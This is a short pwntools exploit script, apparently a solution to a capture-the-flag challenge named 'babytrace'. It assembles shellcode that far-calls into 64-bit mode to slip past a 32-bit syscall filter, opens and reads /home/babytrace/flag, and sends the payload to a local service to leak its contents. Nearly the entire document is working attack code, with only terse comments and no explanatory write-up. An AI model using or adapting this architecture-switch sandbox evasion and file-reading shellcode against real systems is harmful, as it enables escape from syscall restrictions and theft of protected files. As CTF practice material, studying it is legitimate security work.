#!/usr/bin/python

from pwn import *
sc1 = '''
call 0x33:0x804a100
'''
sc1 = asm(sc1, os='linux', arch='i386')

#sc64_2 = asm(shellcraft.amd64.linux.sh(), os='linux', arch='amd64')
sc2 = '''
_start:
	xor eax, eax
	xor edi, edi
	xor esi, esi
	xor edx, edx

open:
	mov edi, 0x804a124	;
	mov al, 0x2
	syscall 			;
	mov ecx, eax

read:
	xor eax, eax
	mov edi, ecx
	mov esi, 0x804a138	;
	mov edx, 0x100
	syscall

exit:
	retf

'''

sc2 = asm(sc2, os='linux', arch='amd64')

sc3 = '''
xor eax, eax
xor ebx, ebx
xor ecx, ecx
xor edx, edx

mov al, 0x5
mov ebx, 0x804a124
int 0x80
'''
sc3 = asm(sc3, os='linux', arch='i386')

sc_addr = 0x804a040
payload = sc1			#change arch to x86_64
payload += sc3			#call sys_open to leak flag
payload +=  "\x90"*(0x804a100-sc_addr-len(payload))	#pad
payload += sc2 			#read flag to addr after the filename
						#!!!The purpose is leak flag when program write filename with error information
payload += "/home/babytrace/flag\x00"

#context.log_level = 'debug'
config = '''
b *0x08048438
'''

s = remote('localhost', 2222)
#s = process('./babytrace')
#s.recvuntil('shellcode: ')
#gdb.attach(s, config)


print repr(payload)
pause()
s.sendline(payload)
s.interactive()

